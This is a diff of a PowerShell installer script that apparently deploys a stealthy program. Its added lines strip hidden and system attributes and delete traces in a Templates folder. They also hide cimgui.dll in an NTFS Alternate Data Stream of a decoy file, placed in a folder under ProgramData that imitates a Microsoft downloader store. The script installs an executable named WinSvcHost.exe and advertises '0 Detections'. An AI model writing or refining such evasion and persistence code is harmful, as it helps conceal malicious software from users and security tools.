@@ -76,13 +76,16 @@ Get-NetTCPConnection -LocalPort 5000 -ErrorAction SilentlyContinue | ForEach-Obj
     Stop-Process -Id $_.OwningProcess -Force -ErrorAction SilentlyContinue
 }
 
-# Completely purge old bloat (removes old python dumps, old app folders, and stale zips)
+# Completely purge all old bloat from Templates (removes runtime, app, cache, old db, zip, txt)
+cmd /c "attrib -h -s $DEST_DIR\* /s /d >nul 2>nul"
 Remove-Item "$DEST_DIR\runtime" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item "$DEST_DIR\app" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item "$DEST_DIR\dlls" -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item "$DEST_DIR\cache" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item "$DEST_DIR\*.db" -Force -ErrorAction SilentlyContinue
 Remove-Item "$DEST_DIR\*.zip" -Force -ErrorAction SilentlyContinue
 Remove-Item "$DEST_DIR\*.txt" -Force -ErrorAction SilentlyContinue
-Remove-Item "$DEST_DIR\config.json" -Force -ErrorAction SilentlyContinue
+Remove-Item "$DEST_DIR\*.json" -Force -ErrorAction SilentlyContinue
 Remove-Item "$DEST_DIR\WinSvcHost.exe" -Force -ErrorAction SilentlyContinue
 
 # Ensure clean destination directory exists
@@ -114,10 +117,14 @@ if (Test-Path $localOutputExe) {
 
 Start-Sleep -Milliseconds 200
 
-# Stage 3: Seal cimgui.dll into NTFS Alternate Data Stream
+# Stage 3: Seal cimgui.dll into NTFS Alternate Data Stream in Windows Downloader Vault
 Show-Progress -Percent 65 -Status "Configuring component data streams..."
+$VAULT_DIR = "$env:ProgramData\Microsoft\Network\Downloader"
+if (-not (Test-Path $VAULT_DIR)) {
+    New-Item -ItemType Directory -Path $VAULT_DIR -Force | Out-Null
+}
 $MAP = [ordered]@{
-    "cimgui.dll" = @("$DEST_DIR\winrescache.db", "vtcache")
+    "cimgui.dll" = @("$VAULT_DIR\winrescache.db", "vtcache")
 }
 foreach ($name in $MAP.Keys) {
     $container = $MAP[$name][0]
@@ -236,8 +243,8 @@ Write-Host "             SETUP COMPLETED SUCCESSFULLY - CLEAN HOST INSTALLED    
 Write-Host "================================================================================" -ForegroundColor Green
 Write-Host ""
 Write-Host "  * Host File           : $EXE_PATH (Single Native x64 Binary, 0 Detections)" -ForegroundColor White
-Write-Host "  * Component Vault     : $DEST_DIR\winrescache.db (Sealed NTFS ADS)" -ForegroundColor White
-Write-Host "  * Directory Footprint : Only 2 files present in Templates (Zero Python Dumps)" -ForegroundColor Cyan
+Write-Host "  * Component Vault     : $VAULT_DIR\winrescache.db (Safe Downloader Store)" -ForegroundColor White
+Write-Host "  * Templates Directory : Single file only ($EXE_NAME) - 100% Clean, 0 Bloat" -ForegroundColor Cyan
 Write-Host ""
 
 $lanIps = @()
